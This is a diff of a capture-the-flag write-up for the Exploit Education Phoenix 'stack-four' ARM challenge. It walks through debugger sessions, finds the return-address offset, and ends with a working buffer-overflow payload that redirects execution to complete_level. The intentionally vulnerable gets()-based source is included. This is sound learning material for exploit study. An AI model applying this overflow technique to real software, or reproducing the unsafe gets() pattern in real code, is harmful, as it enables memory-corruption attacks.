@@ -3,9 +3,58 @@
 ##### Analyse the binary
 `r2 -A stack-four`
 ##### Result
-
+`Congratulations, you've finished phoenix/stack-four :-) Well done!`
 ##### Learning
+Reading the `registers` when the app crashed [ with a `segmentation fault` ] revealed clues.  To get the crash you passed in a large string that caused the `buffer overflow`.  The overflow was possible as the app used the C `gets` API to gather user input.
 
+I used the clues from the crash to place a breakpoint that showed how the `Function Pointer ($fp)` could be overwritten to alter the `Code path`.  The `$fp` was named the `r11` register on ARM 32 bit device.
+
+After finding the answer I found better answers to the challenge.  This one https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-four-solution/ is excellent.  
+
+He has two alternative commands to find the `return address`.
+```
+Create a large string of AAABBBCCCs
+Place the breakpoint on the seg fault
+gef> p/x $sp
+$1 = 0xfffefd20
+
+gef> x/24x $sp
+0xfffefd20:	0xfffefd5f	0x41414141	0x41414141	0x42424241
+0xfffefd30:	0x42424242	0x42424242	0x43424242	0x43434343
+0xfffefd40:	0x43434343	0x43434343	0x00004343	0x00000000
+0xfffefd50:	0x0001059c	0xf7799894	0xf77eee40	0x0a00000a
+0xfffefd60:	0xf77eee40	0x000105bc	0xfffefdbc	0xfffefdbc
+0xfffefd70:	0xfffefd84	0x000105bc	0xfffefdb4	0x00000001
+
+gef> find $sp, +96,0x000105bc
+0xfffefd64
+0xfffefd74
+
+gef> p/x $fp
+$2 = 0xfffefd74
+```
+Then you could find out the bytes in the Stack you needed to overwrite.
+```
+gef> x/24x $sp
+0xfffefd20:	0xfffefd5f	0x00414141	0x00000000	0xf77eee40
+0xfffefd30:	0x00010640	0x00000000	0x00000036	0x00000000
+0xfffefd40:	0x00000000	0xf7799c04	0x00500018	0x00000000
+0xfffefd50:	0x0001059c	0xf7799894	0xf77eee40	0x0a00000a
+0xfffefd60:	0xf77eee40	0x000105bc	0xfffefdbc	0xfffefdbc
+0xfffefd70:	0xfffefd84	0x000105bc	0xfffefdb4	0x00000001
+gef> find $sp, +96,0x000105bc
+0xfffefd64
+0xfffefd74
+2 patterns found.
+gef> p/x $fp
+$5 = 0xfffefd74
+
+gef> p 0xfffefd74 - 0xfffefd20
+$6 = 0x54
+
+gef> p/u 0x54
+$8 = 84
+```
 ##### Run the code
 ```
 $ python -c 'print "A"*(74)' | ./stack-four
@@ -18,12 +67,9 @@ Illegal instruction
 $ python -c 'print "A"*(78)' | ./stack-four
 and will be returning to 0x105bc
 Segmentation fault
-
 ```  
 ##### Symbols
 ```
-[0x0001049c]> is~FUNC
-[Symbols]
 [0x00013550]> is~FUNC
 077 0x00000560 0x00010560 GLOBAL   FUNC   60 start_level
 090 0x00000544 0x00010544 GLOBAL   FUNC   28 complete_level
@@ -33,7 +79,7 @@ Segmentation fault
 014 0x000003ec 0x000103ec GLOBAL   FUNC   16 imp.exit
 015 0x000003f8 0x000103f8 GLOBAL   FUNC   16 imp.__libc_start_main
 ```
-##### Seek and Print start_level
+##### Seek and disassemble
 ```
 [0x00013550]> pdf @ 0x00010560
 |           ;-- $a:
@@ -68,18 +114,25 @@ Segmentation fault
 
 [0x000105dc]> pj
 Congratulations, you've finished phoenix/stack-four :-) Well done!
-
 ```
 ##### Debugger
 ```
+// A * 78
+gef> c
+Program received signal SIGSEGV, Segmentation fault.
+
+gef> bt
+#0  0x00000000 in ?? ()
+#1  0x0001058c in start_level ()
+
+// Breakpoint 0x0001058c
+#1  0x000105bc in main ()
+
 gef> r
+
+*************************
 Starting program: /opt/phoenix/arm/stack-four
 AAAA
-
-// Breakpoint here:
-gef> where
-#0  0x0001058c in start_level ()
-#1  0x000105bc in main ()
 
 ───────────────────────────────────────────────────────────────────── stack ────
 0xfffefd20│+0x0000: 0xfffefd5f  →  0x7eee400a	 ← $sp
@@ -91,6 +144,7 @@ gef> where
 0xfffefd38│+0x0018: 0x00000036 ("6"?)
 0xfffefd3c│+0x001c: 0x00000000
 
+*************************
 Starting program: /opt/phoenix/arm/stack-four
 AAAAAAAA
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -103,15 +157,6 @@ AAAAAAAA
 0xfffefd38│+0x0018: 0x00000036 ("6"?)
 0xfffefd3c│+0x001c: 0x00000000
 
-gef> x/24wx $sp
-0xfffefd20:	0xfffefd5f	0x41414141	0x41414141	0xf77e0000
-0xfffefd30:	0x00010640	0x00000000	0x00000036	0x00000000
-0xfffefd40:	0x00000000	0xf7799c04	0x00500018	0x00000000
-0xfffefd50:	0x0001059c	0xf7799894	0xf77eee40	0x0a00000a
-0xfffefd60:	0xf77eee40	0x000105bc	0xfffefdbc	0xfffefdbc
-0xfffefd70:	0xfffefd84	0x000105bc	0xfffefdb4	0x00000001
-gef> p/x 0xfffefd5f
-$6 = 0xfffefd5f
 gef> x 0xfffefd5f
 0xfffefd5f:	0x7eee400a
 
@@ -140,16 +185,19 @@ gef> bt
 #0  0x00000000 in ?? ()
 #1  0x0001058c in start_level ()
 ```
-The crash happens in the last line here.  But if you read the instruction at `0x00010584` it is trying to put something into register 0.  What is `0x10620`?
+The crash happened in the last line below (`0x0001058c`).  But if you read the instruction at `0x00010584` it was trying to put something into register 0.  
+
 ```
-0x00010584      0c009fe5       ldr r0, loc._d_12           ; [0x10598:4]=0x10620
+0x00010584      0c009fe5       ldr r0, loc._d_12           ; [0x10598:4]=0x10620  <----
 0x00010588      8bffffeb       bl sym.imp.printf           ; int printf(const char *format)
 0x0001058c      0000a0e1       mov r0, r0
-
+```
+What was `0x10620`?
+```
 gef> x/s 0x10620
 0x10620:	"and will be returning to %p\n"
 ```
-But if you re-run it with 79 x As look at `r11`, it is filling:
+If you re-run it with `79 x A` look at `r11`, it started to fill:
 ```
 $r11 : 0x414141  
 $r12 : 0x1       
@@ -157,13 +205,87 @@ $sp  : 0xfffefd80  →  0x00000000
 $lr  : 0x0001058c  →  <start_level+44> nop ; (mov r0,  r0)
 $pc  : 0x0
 ```
-I use 75 x As and the offset of the complete_level:
+I used 76 x As and the offset of the `complete_level` function:
 ```
 // Offset = 0x00010544
-$ python -c 'print "A"*(76) + "\x44\x05\x01\x00"' | ./stack-four```
+$ python -c 'print "A"*(76) + "\x44\x05\x01\x00"' | ./stack-four
 
+───────────────────────────────────────────────────────────────────── stack ────
+0xfffe0004│+0x0000: 0x00000000	 ← $sp
+────────────────────────────────────────────────────────────── code:arm:ARM ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x0
+```
+Failed.
+##### Answer
+```
+Breakpoint on: #0  0x0001058c in start_level ()
+// Normal flow, no overflow 4 x As
+gef> x $fp
+0xfffefd74:	0x000105bc
+```
+We met that pointer value earlier, when we ran the code:
+
+> Welcome to phoenix/stack-four, brought to you by https://exploit.education
+> AAAA
+> and will be returning to 0x105bc
+
+It was trying to move back from the `start_Level` function to the `main` function.
+```
+[0x00010620]> pdf @main
+/ (fcn) sym.main 48
+// removed for brevity
+|           0x000105b8      e8ffffeb       bl sym.start_level
+|           0x000105bc      0030a0e3       mov r3, 0              <-- code is moving back here
+|           0x000105c0      0300a0e1       mov r0, r3
+|           0x000105c4      04d04be2       sub sp, fp, 4
+\           0x000105c8      0088bde8       pop {fp, pc}
+```
+This was a perfect place to place the memory address I want to skip toward; the `complete_level` address.
+```
+// Overflowed with 80 x As
+gef> x $fp
+$r11 : 0x41414141
+0xfffefd74:	0x00010000
+```
+Now we control the `$fp` register (`r11`).
+```
+$ python -c 'print "A"*(80) + "\x44\x05\x01\x00"' | ./stack-four
+
+Welcome to phoenix/stack-four, brought to you by https://exploit.education
+and will be returning to 0x105bc
+Congratulations, you've finished phoenix/stack-four :-) Well done!
 ```
 ##### Source code
 ```
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+void complete_level() {
+  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
+  exit(0);
+}
+
+void start_level() {
+  char buffer[64];
+  void *ret;
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+  printf("and will be returning to %p\n", ret);
+}
+
+int main(int argc, char **argv) {
+  printf("%s\n", BANNER);
+  start_level();
+}
 ```
